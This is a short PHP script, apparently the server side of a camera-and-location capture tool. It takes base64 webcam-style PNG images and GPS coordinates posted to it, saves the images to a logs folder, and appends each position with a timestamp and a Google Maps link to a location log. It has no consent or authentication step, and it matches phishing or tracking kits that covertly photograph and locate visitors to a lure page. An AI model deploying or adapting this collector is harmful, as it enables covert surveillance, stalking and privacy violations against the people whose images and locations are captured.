<?php
$data = json_decode(file_get_contents("php://input"), true);

if (isset($data['image'])) {
    $img = $data['image'];
    $img = str_replace('data:image/png;base64,', '', $img);
    $img = str_replace(' ', '+', $img);
    $dataDecoded = base64_decode($img);
    $file = 'logs/' . time() . '.png';
    file_put_contents($file, $dataDecoded);
}

if (isset($data['latitude']) && isset($data['longitude'])) {
    $lat = $data['latitude'];
    $lon = $data['longitude'];
    $timestamp = date("Y-m-d H:i:s");
    $locationText = "[$timestamp] Lat: $lat, Lon: $lon\n";
    $mapLink = "Google Maps: https://www.google.com/maps?q=$lat,$lon\n\n";
    file_put_contents("logs/location.txt", $locationText . $mapLink, FILE_APPEND);
}
?>
